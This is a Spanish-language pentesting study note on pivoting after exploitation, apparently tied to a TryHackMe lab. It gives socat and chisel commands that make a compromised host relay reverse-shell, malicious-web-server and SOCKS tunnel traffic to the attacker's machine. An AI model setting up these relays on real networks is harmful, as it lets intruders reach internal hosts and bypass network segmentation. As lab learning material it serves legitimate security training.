
Hay que tener en cuenta que el pivoting forma parte de la Post-Explotación, osea que primero hay que conseguir explotar la máquina para poder pivotar a otras máquinas que estén en sus redes internas a las que nosotros como atacante no tenemos acceso.

Los [Socat](https://tryhackme.com/room/wreath) están en un archivo ZIP de la sala Wreath de Tryhackme, cuya contraseña es WreathNetwork, habría que descargarlo, descomprimirlo y mirar en la carpeta "Cats".

O lo podemos descargar desde estos enlaces:

[Socat Linux x32 y x64](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

[Socat Windows x32 y x64](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)


**Para redirigir el tráfico de las conexiones a nuestra máquina atacante tiramos de socat.

Por ejemplo, si necesitamos que nuestra víctima 2 haga conexión con nuestra máquina local ya sea para reverse shell o para ser explotada mediante algun servidor php o algo, tiene que pasar por la víctima 1 que ya ha sido explotada.

Entonces:

***-Víctima 1 se pone a la escucha con socat por el puerto 4343 para redirigir (fork) el tráfico a nuestra kali por el puerto 80/443 por ej:

```
./socat TCP-LISTEN:4343,fork TCP:IPkali:80
```

Ahora la víctima 2 le hace la petición a la víctima 1 para que esa petición sea redirigida hasta la máquina kali.

*Usar el puerto 80 cuando montemos un servidor web malicioso y el 443 cuando queramos una reverse shell.


**---CONCATENACIÓN DE PROXYS CON SOCAT Y CHISEL---

Cuando queramos pivotar con un dual proxy (o más) tenemos que hacer lo siguiente:

Queremos un túnel de la *víctima 2* para pivotar hasta ella.

```
./chisel client IPvictima1:2322 R:8888:socks
```

Pero tenemos que redirigir el tráfico desde la *víctima 1* hasta nuestra máquina de atacante

```
./socat TCP-LISTEN:2322,fork TCP:IPkali:1234
```

*De ésta forma redirigimos esa conexión de chisel de la víctima 2, con socat desde la víctima 1, hasta que hace la conexión a nuestra kali y tenemos el proxy en el localhost puerto 8888.

REDIRIGIR EL TRÁFICO SIEMPRE AL NODO MÁS CERCANO (que estén en la misma red).

